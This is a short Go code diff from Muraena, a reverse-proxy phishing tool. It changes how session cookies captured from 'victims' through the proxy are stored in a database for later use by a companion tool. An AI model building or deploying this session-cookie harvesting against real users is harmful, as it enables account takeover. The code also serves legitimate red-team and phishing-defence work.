@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"crypto/tls"
 	"fmt"
+	"github.com/muraenateam/muraena/core/db"
 	"io/ioutil"
 	"net/http"
 	"net/url"
@@ -284,7 +285,18 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 				c.Domain = response.Request.Host
 			}
 
-			muraena.Tracker.AddToCookieJar(victim, *c)
+			sessCookie := db.VictimCookie{
+				Name:     c.Name,
+				Value:    c.Value,
+				Domain:   c.Domain,
+				Expires:  c.Expires.String(), // will be set by necrobrowser
+				Path:     c.Path,
+				HTTPOnly: c.HttpOnly,
+				Secure:   c.Secure,
+			}
+
+			//log.Info("%s", sessCookie)
+			muraena.Tracker.AddToCookieJar(victim.ID, sessCookie)
 		}
 	} else {
 
@@ -434,7 +446,6 @@ func (st *SessionType) HandleFood(response http.ResponseWriter, request *http.Re
 		}
 	}
 
-
 	// PortMapping
 	if sess.Config.Proxy.Listener.PortMap != "" {
 
@@ -458,7 +469,6 @@ func (st *SessionType) HandleFood(response http.ResponseWriter, request *http.Re
 			}
 		}
 	}
-
 
 	if destination == "" {
 		log.Error("Unexpected request at: %s", request.Host)
